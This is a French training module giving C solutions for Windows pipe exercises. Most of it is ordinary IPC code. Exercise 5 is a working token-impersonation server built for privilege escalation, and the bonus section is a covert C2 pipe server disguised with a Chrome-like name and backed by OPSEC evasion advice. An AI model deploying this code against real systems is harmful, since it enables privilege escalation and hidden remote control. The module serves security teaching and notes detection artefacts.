# Module W09 : Pipes Windows - Solutions

## Solution Exercice 1 : Anonymous Pipe - Redirection I/O

**Objectif** : Capturer la sortie d'une commande via anonymous pipe

```c
#include <windows.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <commande>\n", argv[0]);
        printf("Exemple: %s \"dir C:\\\"\n", argv[0]);
        return 1;
    }

    printf("[*] === Exercice 1 : Anonymous Pipe ===\n\n");

    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};  // Heritabilite
    char buffer[4096];
    DWORD bytesRead;

    // 1. Créer un anonymous pipe
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        printf("[-] CreatePipe echoue: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Anonymous pipe cree\n");
    printf("[+] Read handle: 0x%p\n", hReadPipe);
    printf("[+] Write handle: 0x%p\n\n", hWritePipe);

    // 2. Préparer les structures pour CreateProcess
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;

    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWritePipe;   // Rediriger stdout
    si.hStdError = hWritePipe;    // Rediriger stderr
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

    // 3. Construire la commande
    char cmdLine[1024];
    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c %s", argv[1]);

    printf("[*] Commande: %s\n\n", cmdLine);

    // 4. Lancer le processus
    if (!CreateProcessA(
            NULL,
            cmdLine,
            NULL, NULL,
            TRUE,              // Heriter les handles
            CREATE_NO_WINDOW,  // Pas de fenetre
            NULL, NULL,
            &si, &pi)) {
        printf("[-] CreateProcess echoue: %lu\n", GetLastError());
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return 1;
    }

    printf("[+] Processus cree (PID: %lu)\n", pi.dwProcessId);

    // 5. Fermer le handle d'écriture côté parent
    CloseHandle(hWritePipe);

    // 6. Lire la sortie du processus
    printf("[+] Lecture de la sortie:\n");
    printf("========================================\n");

    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        printf("%s", buffer);
    }

    printf("========================================\n");

    // 7. Attendre la fin du processus
    WaitForSingleObject(pi.hProcess, INFINITE);

    // 8. Nettoyer
    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("\n[+] Termine\n");

    return 0;
}
```

**Explications** :
- Anonymous pipe unidirectionnel : processus parent lit, processus enfant écrit
- `SECURITY_ATTRIBUTES` avec `bInheritHandle = TRUE` : nécessaire pour que l'enfant hérite du handle
- `CREATE_NO_WINDOW` : exécution sans fenêtre visible

---

## Solution Exercice 2 : Named Pipe - Serveur

**Objectif** : Créer un serveur de named pipe

```c
#include <windows.h>
#include <stdio.h>

#define PIPE_NAME "\\\\.\\pipe\\mypipe"
#define BUFFER_SIZE 4096

int main() {
    printf("[*] === Exercice 2 : Named Pipe Serveur ===\n\n");

    HANDLE hPipe;
    char buffer[BUFFER_SIZE];
    DWORD bytesRead, bytesWritten;
    int clientCount = 0;

    printf("[*] Creation du named pipe: %s\n", PIPE_NAME);

    while (1) {
        // Créer le named pipe
        hPipe = CreateNamedPipeA(
            PIPE_NAME,
            PIPE_ACCESS_DUPLEX,              // Bidirectionnel
            PIPE_TYPE_MESSAGE |              // Mode message
            PIPE_READMODE_MESSAGE |
            PIPE_WAIT,                       // Bloquant
            PIPE_UNLIMITED_INSTANCES,        // Instances illimitees
            BUFFER_SIZE,                     // Output buffer
            BUFFER_SIZE,                     // Input buffer
            0,                               // Timeout par defaut
            NULL                             // Security attributes
        );

        if (hPipe == INVALID_HANDLE_VALUE) {
            printf("[-] CreateNamedPipe echoue: %lu\n", GetLastError());
            return 1;
        }

        printf("[+] Named pipe cree, en attente de connexion...\n");

        // Attendre une connexion
        if (!ConnectNamedPipe(hPipe, NULL)) {
            DWORD error = GetLastError();
            if (error != ERROR_PIPE_CONNECTED) {
                printf("[-] ConnectNamedPipe echoue: %lu\n", error);
                CloseHandle(hPipe);
                continue;
            }
        }

        clientCount++;
        printf("[+] Client #%d connecte!\n\n", clientCount);

        // Boucle de communication
        while (1) {
            // Lire le message
            BOOL success = ReadFile(hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL);

            if (!success || bytesRead == 0) {
                if (GetLastError() == ERROR_BROKEN_PIPE) {
                    printf("[*] Client deconnecte\n\n");
                } else {
                    printf("[-] ReadFile echoue: %lu\n", GetLastError());
                }
                break;
            }

            buffer[bytesRead] = '\0';
            printf("[+] Recu: %s\n", buffer);

            // Traiter la commande
            if (strcmp(buffer, "quit") == 0) {
                const char *response = "Bye!";
                WriteFile(hPipe, response, strlen(response), &bytesWritten, NULL);
                break;
            } else if (strcmp(buffer, "time") == 0) {
                SYSTEMTIME st;
                GetLocalTime(&st);
                char timeStr[100];
                snprintf(timeStr, sizeof(timeStr),
                         "Heure actuelle: %02d:%02d:%02d",
                         st.wHour, st.wMinute, st.wSecond);
                WriteFile(hPipe, timeStr, strlen(timeStr), &bytesWritten, NULL);
            } else {
                const char *response = "Message bien recu!";
                WriteFile(hPipe, response, strlen(response), &bytesWritten, NULL);
            }

            printf("[+] Reponse envoyee\n\n");
        }

        // Déconnecter et fermer
        DisconnectNamedPipe(hPipe);
        CloseHandle(hPipe);
    }

    return 0;
}
```

---

## Solution Exercice 3 : Named Pipe - Client

**Objectif** : Se connecter à un named pipe et communiquer

```c
#include <windows.h>
#include <stdio.h>

#define PIPE_NAME "\\\\.\\pipe\\mypipe"
#define BUFFER_SIZE 4096

int main(int argc, char *argv[]) {
    printf("[*] === Exercice 3 : Named Pipe Client ===\n\n");

    HANDLE hPipe;
    char sendBuffer[BUFFER_SIZE];
    char recvBuffer[BUFFER_SIZE];
    DWORD bytesRead, bytesWritten;

    // Nom du pipe (local ou distant)
    const char *pipeName = (argc > 1) ? argv[1] : PIPE_NAME;
    printf("[*] Connexion au pipe: %s\n", pipeName);

    // 1. Attendre que le pipe soit disponible
    if (!WaitNamedPipeA(pipeName, NMPWAIT_WAIT_FOREVER)) {
        printf("[-] WaitNamedPipe echoue: %lu\n", GetLastError());
        printf("[-] Le serveur n'est pas en cours d'execution\n");
        return 1;
    }

    // 2. Se connecter au pipe
    hPipe = CreateFileA(
        pipeName,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile echoue: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Connecte au pipe!\n\n");

    // 3. Passer en mode message
    DWORD mode = PIPE_READMODE_MESSAGE;
    if (!SetNamedPipeHandleState(hPipe, &mode, NULL, NULL)) {
        printf("[-] SetNamedPipeHandleState echoue: %lu\n", GetLastError());
        CloseHandle(hPipe);
        return 1;
    }

    // 4. Boucle d'interaction
    printf("Commandes disponibles:\n");
    printf("  time  - Obtenir l'heure du serveur\n");
    printf("  quit  - Quitter\n\n");

    while (1) {
        printf("Commande: ");
        fgets(sendBuffer, sizeof(sendBuffer), stdin);
        sendBuffer[strcspn(sendBuffer, "\n")] = 0;  // Enlever \n

        // Envoyer le message
        if (!WriteFile(hPipe, sendBuffer, strlen(sendBuffer), &bytesWritten, NULL)) {
            printf("[-] WriteFile echoue: %lu\n", GetLastError());
            break;
        }

        printf("[+] Envoye: %s\n", sendBuffer);

        // Recevoir la réponse
        if (!ReadFile(hPipe, recvBuffer, sizeof(recvBuffer) - 1, &bytesRead, NULL)) {
            printf("[-] ReadFile echoue: %lu\n", GetLastError());
            break;
        }

        recvBuffer[bytesRead] = '\0';
        printf("[+] Reponse: %s\n\n", recvBuffer);

        if (strcmp(sendBuffer, "quit") == 0) {
            break;
        }
    }

    CloseHandle(hPipe);
    printf("[*] Deconnecte\n");

    return 0;
}
```

**Test** :
```bash
# Terminal 1 : Lancer le serveur
pipe_server.exe

# Terminal 2 : Lancer le client
pipe_client.exe

# Tester les commandes
Commande: time
Commande: quit
```

---

## Solution Exercice 4 : Named Pipe sur réseau (SMB)

**Objectif** : Se connecter à un pipe sur une machine distante

```c
#include <windows.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <hostname> <pipe_name>\n", argv[0]);
        printf("Exemple: %s 192.168.1.100 mypipe\n", argv[0]);
        printf("Exemple: %s SERVER01 mypipe\n", argv[0]);
        return 1;
    }

    const char *hostname = argv[1];
    const char *pipeName = argv[2];

    printf("[*] === Exercice 4 : Named Pipe reseau (SMB) ===\n\n");

    // Construire le chemin UNC
    char pipeUNC[512];
    snprintf(pipeUNC, sizeof(pipeUNC), "\\\\%s\\pipe\\%s", hostname, pipeName);

    printf("[*] Chemin UNC: %s\n", pipeUNC);
    printf("[*] Connexion...\n");

    // Attendre que le pipe soit disponible
    if (!WaitNamedPipeA(pipeUNC, 10000)) {  // Timeout 10 secondes
        DWORD error = GetLastError();
        printf("[-] WaitNamedPipe echoue: %lu\n", error);

        if (error == ERROR_BAD_NETPATH) {
            printf("[-] Chemin reseau invalide\n");
        } else if (error == ERROR_SEM_TIMEOUT) {
            printf("[-] Timeout: Le serveur ne repond pas\n");
        }
        return 1;
    }

    // Se connecter
    HANDLE hPipe = CreateFileA(
        pipeUNC,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile echoue: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Connecte au pipe distant!\n\n");

    // Envoyer un message de test
    const char *message = "Hello from remote client!";
    DWORD bytesWritten, bytesRead;
    char buffer[1024];

    if (WriteFile(hPipe, message, strlen(message), &bytesWritten, NULL)) {
        printf("[+] Message envoye: %s\n", message);

        if (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
            buffer[bytesRead] = '\0';
            printf("[+] Reponse recue: %s\n", buffer);
        }
    }

    CloseHandle(hPipe);

    printf("\n[*] Communication SMB terminee\n");
    printf("[*] Port utilise: 445 (SMB)\n");

    return 0;
}
```

**Explications** :
- Chemin UNC : `\\hostname\pipe\pipename`
- Fonctionne via SMB (port 445)
- Nécessite que le pare-feu autorise SMB
- Utilisé par Cobalt Strike pour le SMB beaconing

---

## Solution Exercice 5 : Token Impersonation via Pipe

**Objectif** : Voler un token via ImpersonateNamedPipeClient

```c
#include <windows.h>
#include <stdio.h>

#define PIPE_NAME "\\\\.\\pipe\\impersonate_test"

void PrintCurrentUser() {
    char username[256];
    DWORD usernameLen = sizeof(username);

    if (GetUserNameA(username, &usernameLen)) {
        printf("[*] Utilisateur actuel: %s\n", username);
    }
}

int main() {
    printf("[*] === Exercice 5 : Token Impersonation ===\n\n");
    printf("[!] AVERTISSEMENT : Technique d'elevation de privileges\n");
    printf("[!] A utiliser UNIQUEMENT dans un environnement de test\n\n");

    HANDLE hPipe;

    // 1. Créer un pipe avec permissions permissives
    SECURITY_DESCRIPTOR sd;
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);  // Everyone peut se connecter

    SECURITY_ATTRIBUTES sa = {sizeof(sa), &sd, FALSE};

    hPipe = CreateNamedPipeA(
        PIPE_NAME,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1,                  // 1 instance seulement
        4096, 4096, 0,
        &sa
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] CreateNamedPipe echoue: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Pipe cree: %s\n", PIPE_NAME);
    printf("[+] Permissions: Everyone (DACL nulle)\n\n");

    printf("[*] Contexte AVANT connexion:\n");
    PrintCurrentUser();

    printf("\n[+] En attente de connexion d'un client privilegie...\n");
    printf("    (Executer depuis un autre terminal en tant qu'admin:\n");
    printf("     echo test > %s)\n\n", PIPE_NAME);

    // 2. Attendre une connexion
    if (!ConnectNamedPipe(hPipe, NULL)) {
        DWORD error = GetLastError();
        if (error != ERROR_PIPE_CONNECTED) {
            printf("[-] ConnectNamedPipe echoue: %lu\n", error);
            CloseHandle(hPipe);
            return 1;
        }
    }

    printf("[+] Client connecte!\n\n");

    // 3. Impersonate le client
    if (ImpersonateNamedPipeClient(hPipe)) {
        printf("[+] Impersonation reussie!\n\n");

        printf("[*] Contexte APRES impersonation:\n");
        PrintCurrentUser();

        // 4. Obtenir le token
        HANDLE hToken;
        if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {
            printf("[+] Token obtenu: 0x%p\n", hToken);

            // Ici, on pourrait :
            // - Créer un processus avec ce token (CreateProcessAsUser)
            // - Dupliquer le token pour usage ultérieur
            // - Analyser les privilèges du token

            CloseHandle(hToken);
        }

        // 5. Revenir au contexte original
        RevertToSelf();
        printf("\n[+] Revert to self execute\n");

    } else {
        printf("[-] ImpersonateNamedPipeClient echoue: %lu\n", GetLastError());
    }

    printf("\n[*] Contexte APRES revert:\n");
    PrintCurrentUser();

    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);

    return 0;
}
```

**Test d'impersonation** :
```bash
# Terminal 1 (utilisateur normal)
impersonate.exe

# Terminal 2 (administrateur)
echo test > \\.\pipe\impersonate_test
```

**Explications** :
- `ImpersonateNamedPipeClient` : prend l'identité du client connecté
- Technique d'élévation de privilèges si un processus privilégié se connecte
- Utilisé dans des exploits comme RottenPotato, JuicyPotato
- Détecté par les EDR (surveillance des appels ImpersonateNamedPipeClient)

---

## Solution Bonus : Named Pipe C2 (Communication discrète)

**Objectif** : Implémenter un canal C2 via named pipe local

```c
// pipe_c2_server.c - Serveur C2 via pipe
#include <windows.h>
#include <stdio.h>

#define PIPE_NAME "\\\\.\\pipe\\mojo.12345.67890.1234567890"  // Nom Chrome-like

int main() {
    HANDLE hPipe;
    char buffer[8192];
    DWORD bytesRead, bytesWritten;

    printf("[*] C2 Pipe Server\n");
    printf("[*] Pipe: %s\n\n", PIPE_NAME);

    while (1) {
        hPipe = CreateNamedPipeA(
            PIPE_NAME,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            8192, 8192, 0, NULL
        );

        if (hPipe == INVALID_HANDLE_VALUE) {
            printf("[-] Erreur: %lu\n", GetLastError());
            Sleep(1000);
            continue;
        }

        if (ConnectNamedPipe(hPipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
            printf("[+] Implant connecte\n");

            // Recevoir beacon
            if (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
                buffer[bytesRead] = '\0';
                printf("[+] Beacon: %s\n", buffer);

                // Envoyer commande
                printf("Commande> ");
                char cmd[1024];
                fgets(cmd, sizeof(cmd), stdin);
                cmd[strcspn(cmd, "\n")] = 0;

                WriteFile(hPipe, cmd, strlen(cmd), &bytesWritten, NULL);

                // Recevoir résultat
                if (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
                    buffer[bytesRead] = '\0';
                    printf("\n[+] Resultat:\n%s\n\n", buffer);
                }
            }

            DisconnectNamedPipe(hPipe);
        }

        CloseHandle(hPipe);
    }

    return 0;
}
```

---

## Auto-évaluation

Avant de passer au module suivant, vérifiez que vous pouvez :
- [x] Créer et utiliser des anonymous pipes pour la redirection I/O
- [x] Créer des serveurs et clients de named pipes
- [x] Utiliser des pipes sur le réseau via SMB
- [x] Comprendre le mécanisme d'impersonation via pipes
- [x] Implémenter un canal C2 discret avec named pipes
- [x] Identifier les artefacts (Sysmon Event ID 17/18, pipes visibles via Get-ChildItem)
- [x] Appliquer les techniques OPSEC (noms légitimes, permissions strictes)
